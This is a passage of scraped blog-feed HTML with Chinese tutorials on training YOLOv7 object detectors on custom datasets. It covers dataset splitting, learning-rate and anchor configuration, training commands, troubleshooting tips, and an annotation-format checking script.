<span class="hljs-attr">dst_val_label_dir</span> = <span class="hljs-string">"data/custom/labels/val"</span>
<span class="hljs-attr">val_ratio</span> = <span class="hljs-number">0.2</span>  <span class="hljs-comment"># 验证集比例</span>

<span class="hljs-comment"># 创建目标文件夹</span>
os.makedirs(dst_train_img_dir, <span class="hljs-attr">exist_ok</span>=<span class="hljs-literal">True</span>)
os.makedirs(dst_train_label_dir, <span class="hljs-attr">exist_ok</span>=<span class="hljs-literal">True</span>)
os.makedirs(dst_val_img_dir, <span class="hljs-attr">exist_ok</span>=<span class="hljs-literal">True</span>)
os.makedirs(dst_val_label_dir, <span class="hljs-attr">exist_ok</span>=<span class="hljs-literal">True</span>)

<span class="hljs-comment"># 随机划分</span>
<span class="hljs-attr">img_files</span> = [f for f in os.listdir(src_img_dir) if f.endswith((<span class="hljs-string">'.jpg'</span>, <span class="hljs-string">'.png'</span>))]
random.shuffle(img_files)
<span class="hljs-attr">val_num</span> = int(len(img_files) * val_ratio)
<span class="hljs-attr">val_files</span> = img_files[:val_num]
<span class="hljs-attr">train_files</span> = img_files[val_num:]

<span class="hljs-comment"># 复制训练集</span>
for f in train_files:
    <span class="hljs-attr">src_img</span> = os.path.join(src_img_dir, f)
    <span class="hljs-attr">dst_img</span> = os.path.join(dst_train_img_dir, f)
    shutil.copy(src_img, dst_img)
    <span class="hljs-attr">src_label</span> = os.path.join(src_label_dir, os.path.splitext(f)[<span class="hljs-number">0</span>] + <span class="hljs-string">".txt"</span>)
    <span class="hljs-attr">dst_label</span> = os.path.join(dst_train_label_dir, os.path.splitext(f)[<span class="hljs-number">0</span>] + <span class="hljs-string">".txt"</span>)
    shutil.copy(src_label, dst_label)

<span class="hljs-comment"># 复制验证集</span>
for f in val_files:
    <span class="hljs-attr">src_img</span> = os.path.join(src_img_dir, f)
    <span class="hljs-attr">dst_img</span> = os.path.join(dst_val_img_dir, f)
    shutil.copy(src_img, dst_img)
    <span class="hljs-attr">src_label</span> = os.path.join(src_label_dir, os.path.splitext(f)[<span class="hljs-number">0</span>] + <span class="hljs-string">".txt"</span>)
    <span class="hljs-attr">dst_label</span> = os.path.join(dst_val_label_dir, os.path.splitext(f)[<span class="hljs-number">0</span>] + <span class="hljs-string">".txt"</span>)
    shutil.copy(src_label, dst_label)

print(f"划分完成：训练集{len(train_files)}张，验证集{len(val_files)}张")
</code></pre>
<h3 data-id="heading-11">3.2 第二步：超参数与权重配置（核心优化）</h3>
<p>超参数和权重配置错误是新手训练不收敛的第二大原因，按以下配置修改，可大幅提升收敛概率：</p>
<h4 data-id="heading-12">3.2.1 学习率配置（新手推荐）</h4>
<p>YOLOv7官方推荐的学习率是基于batch_size=64的，新手需根据自己的GPU显存调整，遵循“batch_size减半，学习率减半”的原则：</p>
<ul>
<li>如果GPU显存足够（比如单卡24G）：使用默认学习率（lr0=0.01，lrf=0.01）；</li>
<li>如果batch_size=32（显存16G）：将lr0改为0.005；</li>
<li>如果batch_size=16（显存8G）：将lr0改为0.0025；</li>
<li>修改位置：在YOLOv7源码的“data/hyp.scratch.yaml”文件中，找到“lr0”参数修改。</li>
</ul>
<p>新手避坑：不要一开始就用太小的学习率（比如0.0001），会导致Loss下降极慢，误以为不收敛；也不要用太大的学习率（比如0.1），会导致Loss震荡。</p>
<h4 data-id="heading-13">3.2.2 batch_size与梯度累积配置</h4>
<p>如果GPU显存不足，无法设置较大的batch_size，可启用梯度累积（gradient accumulation），等价于增大batch_size：</p>
<ul>
<li>在训练命令中添加“--accumulate n”参数，n为累积步数，比如“--accumulate 2”，则batch_size=16等价于32；</li>
<li>示例：单卡8G显存，设置batch_size=8，accumulate=2，等价于batch_size=16，学习率设置为0.0025。</li>
</ul>
<h4 data-id="heading-14">3.2.3 预训练权重使用（必选）</h4>
<p>新手务必使用官方预训练权重，不要从头训练！步骤如下：</p>
<ol>
<li>下载官方预训练权重：从YOLOv7 GitHub主页下载“yolov7.pt”（基础版）或“yolov7-tiny.pt”（轻量化版，适合显存小的GPU）；</li>
<li>修改网络输出层：如果自定义数据集的类别数（nc）与预训练权重的类别数（80类）不一致，需修改配置文件中的“nc”，并确保输出层维度匹配；</li>
<li>训练时加载预训练权重：在训练命令中添加“--weights yolov7.pt”参数。</li>
</ol>
<h3 data-id="heading-15">3.3 第三步：网络配置修改（适配自定义数据集）</h3>
<p>网络配置错误会导致Loss计算异常，必须按以下步骤修改：</p>
<h4 data-id="heading-16">3.3.1 类别数（nc）修改</h4>
<p>复制官方配置文件“cfg/training/yolov7.yaml”，重命名为“yolov7-custom.yaml”，修改其中的“nc”参数为自定义数据集的类别数，比如2类：</p>
<pre><code class="hljs language-yaml" lang="yaml"><span class="hljs-comment"># parameters</span>
<span class="hljs-attr">nc:</span> <span class="hljs-number">2</span>  <span class="hljs-comment"># number of classes（修改为自己的类别数）</span>
<span class="hljs-attr">depth_multiple:</span> <span class="hljs-number">1.0</span>  <span class="hljs-comment"># model depth multiple</span>
<span class="hljs-attr">width_multiple:</span> <span class="hljs-number">1.0</span>  <span class="hljs-comment"># layer channel multiple</span>

<span class="hljs-comment"># anchors（后续会优化，先保留默认）</span>
<span class="hljs-attr">anchors:</span>
  <span class="hljs-bullet">-</span> [<span class="hljs-number">12</span>,<span class="hljs-number">16</span>, <span class="hljs-number">19</span>,<span class="hljs-number">36</span>, <span class="hljs-number">40</span>,<span class="hljs-number">28</span>]  <span class="hljs-comment"># P3/8</span>
  <span class="hljs-bullet">-</span> [<span class="hljs-number">36</span>,<span class="hljs-number">75</span>, <span class="hljs-number">76</span>,<span class="hljs-number">55</span>, <span class="hljs-number">72</span>,<span class="hljs-number">146</span>]  <span class="hljs-comment"># P4/16</span>
  <span class="hljs-bullet">-</span> [<span class="hljs-number">142</span>,<span class="hljs-number">110</span>, <span class="hljs-number">192</span>,<span class="hljs-number">243</span>, <span class="hljs-number">459</span>,<span class="hljs-number">401</span>]  <span class="hljs-comment"># P5/32</span>

<span class="hljs-comment"># 其他配置保持不变...</span>
</code></pre>
<h4 data-id="heading-17">3.3.2 锚框（anchor）聚类（可选但推荐）</h4>
<p>如果自定义数据集的目标尺寸与官方默认锚框差异较大，会导致模型难以学习，需重新聚类锚框：</p>
<ol>
<li>运行以下代码，对自定义数据集的目标尺寸聚类（保存为cluster_anchors.py）：</li>
</ol>
<pre><code class="hljs language-ini" lang="ini">import numpy as np
import glob
from sklearn.cluster import KMeans

<span class="hljs-comment"># 配置路径</span>
<span class="hljs-attr">label_dir</span> = <span class="hljs-string">"data/custom/labels/train"</span>
<span class="hljs-attr">num_anchors</span> = <span class="hljs-number">9</span>  <span class="hljs-comment"># YOLOv7需要9个锚框（3层×3个）</span>

def load_target_sizes(label_dir):
    <span class="hljs-attr">target_sizes</span> = []
    <span class="hljs-attr">label_paths</span> = glob.glob(os.path.join(label_dir, <span class="hljs-string">"*.txt"</span>))
    for path in label_paths:
        with open(path, 'r') as f:
            <span class="hljs-attr">lines</span> = f.readlines()
            for line in lines:
                <span class="hljs-attr">parts</span> = line.strip().split()
                <span class="hljs-attr">w</span> = float(parts[<span class="hljs-number">3</span>])
                <span class="hljs-attr">h</span> = float(parts[<span class="hljs-number">4</span>])
                target_sizes.append(<span class="hljs-section">[w, h]</span>)
    return np.array(target_sizes)

def cluster_anchors(target_sizes, num_anchors):
    <span class="hljs-attr">kmeans</span> = KMeans(n_clusters=num_anchors, random_state=<span class="hljs-number">0</span>).fit(target_sizes)
    <span class="hljs-attr">anchors</span> = kmeans.cluster_centers_
    <span class="hljs-comment"># 按面积排序，分成3组（对应3个检测层）</span>
    <span class="hljs-attr">anchors</span> = sorted(anchors, key=lambda x: x[<span class="hljs-number">0</span>]*x[<span class="hljs-number">1</span>])
    <span class="hljs-attr">anchors</span> = np.array(anchors).reshape(<span class="hljs-number">3</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>)
    return anchors

if <span class="hljs-attr">__name__</span> == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-attr">target_sizes</span> = load_target_sizes(label_dir)
    <span class="hljs-attr">anchors</span> = cluster_anchors(target_sizes, num_anchors)
    print("聚类得到的锚框（按检测层分组）：")
    print(anchors)
    <span class="hljs-comment"># 示例输出（需替换到yolov7-custom.yaml中）：</span>
    <span class="hljs-comment"># [[[0.05, 0.08], [0.09, 0.12], [0.13, 0.18]],</span>
    <span class="hljs-comment">#  [[0.20, 0.25], [0.28, 0.35], [0.40, 0.45]],</span>
    <span class="hljs-comment">#  [[0.50, 0.60], [0.70, 0.80], [0.90, 1.00]]]</span>
</code></pre>
<ol>
<li>将聚类得到的锚框，替换“yolov7-custom.yaml”中的“anchors”参数。</li>
</ol>
<h3 data-id="heading-18">3.4 第四步：训练命令与监控（实操执行）</h3>
<p>完成以上配置后，执行训练命令，并实时监控训练状态，及时发现问题：</p>
<h4 data-id="heading-19">3.4.1 训练命令（新手推荐）</h4>
<p>根据自己的配置，修改以下命令中的路径和参数，在终端执行：</p>
<pre><code class="hljs language-css" lang="css"># 单卡训练（batch_size=<span class="hljs-number">16</span>，accumulate=<span class="hljs-number">2</span>，等价于<span class="hljs-number">32</span>）
python train<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--weights</span> yolov7<span class="hljs-selector-class">.pt</span> <span class="hljs-attr">--cfg</span> cfg/training/yolov7-custom<span class="hljs-selector-class">.yaml</span> <span class="hljs-attr">--data</span> data/custom/data<span class="hljs-selector-class">.yaml</span> <span class="hljs-attr">--epochs</span> <span class="hljs-number">100</span> <span class="hljs-attr">--batch-size</span> <span class="hljs-number">16</span> <span class="hljs-attr">--accumulate</span> <span class="hljs-number">2</span> <span class="hljs-attr">--device</span> <span class="hljs-number">0</span> <span class="hljs-attr">--name</span> yolov7_custom_train

# 参数说明：
# <span class="hljs-attr">--weights</span>：预训练权重路径
# <span class="hljs-attr">--cfg</span>：自定义网络配置文件路径
# <span class="hljs-attr">--data</span>：数据集配置文件路径（需提前创建，见下文）
# <span class="hljs-attr">--epochs</span>：训练轮数（新手推荐<span class="hljs-number">100</span>，足够观察收敛趋势）
# <span class="hljs-attr">--device</span> <span class="hljs-number">0</span>：使用第<span class="hljs-number">0</span>块GPU
# <span class="hljs-attr">--name</span>：训练日志保存名称
</code></pre>
<h4 data-id="heading-20">3.4.2 数据集配置文件（data.yaml）创建</h4>
<p>在“data/custom/”目录下创建“data.yaml”文件，内容如下（修改路径和类别名）：</p>
<pre><code class="hljs language-bash" lang="bash">train: ../custom/images/train  <span class="hljs-comment"># 训练集图像路径（相对路径）</span>
val: ../custom/images/val      <span class="hljs-comment"># 验证集图像路径</span>
nc: 2                          <span class="hljs-comment"># 类别数</span>
names: [<span class="hljs-string">'class1'</span>, <span class="hljs-string">'class2'</span>]    <span class="hljs-comment"># 类别名称（按类别编号顺序）</span>
</code></pre>
<h4 data-id="heading-21">3.4.3 训练过程监控（关键）</h4>
<p>训练过程中，实时观察以下指标，判断是否收敛：</p>
<ol>
<li><strong>Loss变化</strong>：前10个epoch，train_loss应快速下降（比如从10+降到2以下），如果前20个epoch Loss仍大于5，说明存在问题；</li>
<li><strong>精度变化</strong>：从第30个epoch开始，mAP50应逐步上升，若精度始终为0，需检查标签格式或网络配置；</li>
<li><strong>可视化监控</strong>：启用TensorBoard查看Loss和精度曲线，命令：tensorboard --logdir runs/train/yolov7_custom_train；</li>
<li><strong>中断恢复</strong>：如果训练中断，可通过“--resume”参数恢复训练，命令：python train.py --resume runs/train/yolov7_custom_train/weights/last.pt。</li>
</ol>
<h2 data-id="heading-22">四、实验验证：新手不收敛案例修复对比</h2>
<p>为了验证以上方案的有效性，以“新手常见的标注格式错误+学习率过高”导致的不收敛案例为例，展示修复前后的收敛效果：</p>
<h3 data-id="heading-23">4.1 案例背景</h3>
<ul>
<li>数据集：2类自定义数据集（汽车、行人），共1000张图像；</li>
<li>新手错误操作：标注坐标未归一化（直接使用像素值）、学习率使用0.1（batch_size=16）、未使用预训练权重；</li>
<li>错误现象：train_loss始终在15以上，精度为0，完全不收敛。</li>
</ul>
<h3 data-id="heading-24">4.2 修复方案</h3>
<ol>
<li>用3.1.1节的代码修复标注格式（将像素坐标归一化到0~1）；</li>
<li>将学习率改为0.0025（batch_size=16）；</li>
<li>加载官方yolov7.pt预训练权重。</li>
</ol>
<h3 data-id="heading-25">4.3 修复前后对比</h3>






























<table><thead><tr><th>指标</th><th>修复前（错误配置）</th><th>修复后（正确配置）</th></tr></thead><tbody><tr><td>50epoch train_loss</td><td>18.6</td><td>1.2</td></tr><tr><td>50epoch val_loss</td><td>17.8</td><td>1.5</td></tr><tr><td>50epoch mAP50</td><td>0</td><td>0.78</td></tr><tr><td>预测结果</td><td>全空，无任何框</td><td>能准确框出汽车和行人，置信度≥0.6</td></tr></tbody></table>
<p>从对比结果可以看出，修复后模型快速收敛，精度达到实用水平，验证了方案的有效性。</p>
<h2 data-id="heading-26">五、新手终极避坑指南：10个高频问题快速排查</h2>
<p>总结10个新手训练YOLOv7不收敛的高频问题，按“排查优先级”排序，遇到问题时可逐一对照：</p>
<ol>
<li>标注格式错误（坐标未归一化、类别编号错误、文件名不匹配）→ 用3.1.1节代码检查；</li>
<li>未使用预训练权重，从头训练→ 加载官方yolov7.pt；</li>
<li>学习率过高/过低→ 按batch_size调整lr0；</li>
<li>网络配置文件中nc未修改→ 确保nc等于自定义类别数；</li>
<li>数据集路径错误→ 检查data.yaml中的train/val路径；</li>
<li>GPU显存不足，导致梯度更新失败→ 减小batch_size，启用梯度累积；</li>
<li>锚框与目标尺寸不匹配→ 用3.3.2节代码重新聚类锚框；</li>
<li>数据增强过度，目标被破坏→ 关闭极端增强，使用默认增强参数；</li>
<li>环境依赖不匹配→ 按官方推荐配置PyTorch、CUDA版本；</li>
<li>训练命令参数错误（比如--cfg路径错误）→ 重新检查命令参数。</li>
</ol>
<h2 data-id="heading-27">六、总结：新手训练收敛的核心逻辑</h2>
<p>新手训练YOLOv7不收敛，本质上是“基础配置错误”和“核心参数不当”导致的，并非模型本身难训练。掌握以下核心逻辑，就能轻松解决问题：</p>
<p><strong>1. 基础优先</strong>：先确保数据集标注正确、路径配置无误，这是收敛的前提；</p>
<p><strong>2. 借力预训练</strong>：一定要使用官方预训练权重，避免从头训练，降低收敛难度；</p>
<p><strong>3. 超参适配</strong>：学习率和batch_size要匹配自己的硬件环境，不要盲目使用默认值；</p>
<p><strong>4. 实时监控</strong>：训练过程中及时观察Loss和精度变化，早发现问题早修复。</p>
<p>按照本文的步骤操作，新手也能让YOLOv7模型稳定收敛。如果在实操过程中遇到具体问题，欢迎在评论区留言交流，我会一一解答。</p>
<p>最后，本文所有实操代码均已整理完毕，关注我后私信“YOLOv7收敛”即可获取完整代码包，无加密、无套路。如果觉得这篇文章对你有帮助，欢迎点赞、收藏、转发，你的支持是我持续输出实战技术文的最大动力。</p>
<p>技术之路，从新手到高手，只差“踩坑-复盘-解决”的循环。共勉。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[从数据集标注到模型评估：YOLO完整工作流实战（附避坑清单）]]></title>    <link>https://juejin.cn/post/7594874733383680051</link>    <guid>https://juejin.cn/post/7594874733383680051</guid>    <pubDate>2026-01-14T07:38:50.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7594874733383680051" data-draft-id="7594859060858454026" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" 从数据集标注到模型评估：YOLO完整工作流实战（附避坑清单）"/> <meta itemprop="keywords" content="后端"/> <meta itemprop="datePublished" content="2026-01-14T07:38:50.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员威哥"/> <meta itemprop="url" content="https://juejin.cn/user/3411107130652176"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             从数据集标注到模型评估：YOLO完整工作流实战（附避坑清单）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3411107130652176/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员威哥
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-14T07:38:50.000Z" title="Wed Jan 14 2026 07:38:50 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-14
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读12分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>YOLO系列模型凭借高效的实时检测能力，成为工业级目标检测任务的首选框架。但对新手而言，从原始数据到可用模型的全流程充满“隐形坑”——标注格式出错、训练不收敛、评估指标看不懂等问题，往往让人半途而废。</p>
<p>本文以YOLOv7为例，完整拆解“数据集标注→数据预处理→网络配置→模型训练→模型评估→部署准备”全工作流，每个环节均提供可直接复用的实操代码与避坑要点，最后附上全流程避坑清单，帮新手快速打通从数据到模型的“任督二脉”。</p>
<h2 data-id="heading-0">一、数据集标注：新手入门必会的工具与规范</h2>
<p>高质量标注是模型训练的基础，新手常因标注工具选错、格式不规范，导致后续训练全流程出错。本节聚焦“工具选型+标注规范+格式校验”，帮你高效完成标注工作。</p>
<h3 data-id="heading-1">1.1 标注工具选型：新手首选LabelImg</h3>
<p>推荐新手使用LabelImg（轻量、开源、支持YOLO格式），安装与使用步骤如下：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 1. 安装（Python3环境）</span>
pip install labelImg

<span class="hljs-comment"># 2. 启动工具</span>
labelImg  <span class="hljs-comment"># 终端输入命令，打开可视化界面</span>

<span class="hljs-comment"># 3. 核心设置（关键！避免后续格式转换）</span>
<span class="hljs-comment"># 点击菜单栏“View”，勾选以下选项：</span>
<span class="hljs-comment"># - Auto Save mode（自动保存）</span>
<span class="hljs-comment"># - Display Labels（显示标注框）</span>
<span class="hljs-comment"># - Advanced Mode（高级模式，显示坐标）</span>
<span class="hljs-comment"># 点击“Format”，选择“YOLO”（直接生成YOLO所需txt格式）</span>
</code></pre>
<h3 data-id="heading-2">1.2 标注规范：避免后续训练“踩大坑”</h3>
<p>YOLO模型对标注格式要求严格，需遵循以下规范：</p>
<ul>
<li><strong>格式要求</strong>：每个图像对应一个txt文件，每行标注一个目标，格式为“class x_center y_center width height”（坐标需归一化到0~1范围，即除以图像宽高）；</li>
<li><strong>类别命名</strong>：类别名称统一（如“car”“person”），类别编号从0开始连续编号（禁止跳过0直接从1开始）；</li>
<li><strong>标注精度</strong>：标注框需完全包围目标，避免漏框、多框、框选过多背景（小目标建议放大后标注）；</li>
<li><strong>文件匹配</strong>：txt文件名与对应图像文件名完全一致（如“img_001.jpg”对应“img_001.txt”），且放在指定标签目录。</li>
</ul>
<h3 data-id="heading-3">1.3 标注格式校验：提前规避训练隐患</h3>
<p>标注完成后，务必用以下代码批量校验格式（保存为check_annotation.py），避免因个别错误导致全流程卡壳：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> os
<span class="hljs-keyword">import</span> glob

<span class="hljs-comment"># 配置数据集路径</span>
label_dir = <span class="hljs-string">"data/custom/labels/train"</span>  <span class="hljs-comment"># 训练集标签路径</span>
img_dir = <span class="hljs-string">"data/custom/images/train"</span>    <span class="hljs-comment"># 训练集图像路径</span>
nc = <span class="hljs-number">2</span>  <span class="hljs-comment"># 自定义数据集类别数（根据实际修改）</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">check_annotation</span>():
    <span class="hljs-comment"># 1. 检查标签文件与图像文件是否匹配</span>
    img_files = <span class="hljs-built_in">set</span>([os.path.splitext(f)[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> os.listdir(img_dir) <span class="hljs-keyword">if</span> f.endswith((<span class="hljs-string">'.jpg'</span>, <span class="hljs-string">'.png'</span>))])
    label_files = <span class="hljs-built_in">set</span>([os.path.splitext(f)[<span class="hljs-number">0</span>] <span class="hljs-keyword">for</span> f <span class="hljs-keyword">in</span> os.listdir(label_dir) <span class="hljs-keyword">if</span> f.endswith(<span class="hljs-string">'.txt'</span>)])
    mismatch = img_files - label_files
    <span class="hljs-keyword">if</span> mismatch:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"警告：以下图像无对应标签文件：<span class="hljs-subst">{mismatch}</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    
    <span class="hljs-comment"># 2. 检查标注格式是否正确</span>
    label_paths = glob.glob(os.path.join(label_dir, <span class="hljs-string">"*.txt"</span>))
    <span class="hljs-keyword">for</span> path <span class="hljs-keyword">in</span> label_paths:
        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path, <span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> f:
            lines = f.readlines()
            <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> lines:
                parts = line.strip().split()
                <span class="hljs-comment"># 检查每行是否有5个元素（class x y w h）</span>
                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) != <span class="hljs-number">5</span>:
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"错误：<span class="hljs-subst">{path}</span> 中某行标注格式错误，应为'class x y w h'"</span>)
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
                <span class="hljs-comment"># 检查类别编号是否合法</span>
                class_id = <span class="hljs-built_in">int</span>(parts[<span class="hljs-number">0</span>])
                <span class="hljs-keyword">if</span> class_id &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> class_id &gt;= nc:
                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"错误：<span class="hljs-subst">{path}</span> 中类别编号<span class="hljs-subst">{class_id}</span>超出范围（0~<span class="hljs-subst">{nc-<span class="hljs-number">1</span>}</span>）"</span>)
                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
                <span class="hljs-comment"># 检查坐标是否归一化（0~1）</span>
                coords = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">float</span>, parts[<span class="hljs-number">1</span>:]))
                <span class="hljs-keyword">for</span> coord <span class="hljs-keyword">in</span> coords:
                    <span class="hljs-keyword">if</span> coord &lt; <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> coord &gt; <span class="hljs-number">1</span>:
                        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"错误：<span class="hljs-subst">{path}</span> 中坐标<span class="hljs-subst">{coord}</span>未归一化（应在0~1之间）"</span>)
                        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"标注格式检查通过！"</span>)
    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>

<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">"__main__"</span>:
    check_annotation()
</code></pre>
<h2 data-id="heading-4">二、数据预处理：为训练收敛打基础</h2>
<p>原始标注数据需经过“数据集划分→数据增强→锚框聚类”预处理，才能适配YOLO模型训练。本节步骤直接决定后续模型是否能快速收敛。</p>
<h3 data-id="heading-5">2.1 数据集划分：8:2比例科学拆分</h3>
<p>按“训练集:验证集=8:2”划分，确保两者分布一致（如同一类目标在两组中均有分布），避免因分布差异导致模型泛化能力差。使用以下代码快速划分：</p>
<pre><code class="hljs language-ini" lang="ini">import os
import random
import shutil

<span class="hljs-comment"># 配置路径</span>
<span class="hljs-attr">src_img_dir</span> = <span class="hljs-string">"data/custom/all_images"</span>  <span class="hljs-comment"># 原始图像目录</span>
<span class="hljs-attr">src_label_dir</span> = <span class="hljs-string">"data/custom/all_labels"</span>  <span class="hljs-comment"># 原始标签目录</span>
<span class="hljs-attr">dst_train_img_dir</span> = <span class="hljs-string">"data/custom/images/train"</span>  <span class="hljs-comment"># 训练集图像目录</span>
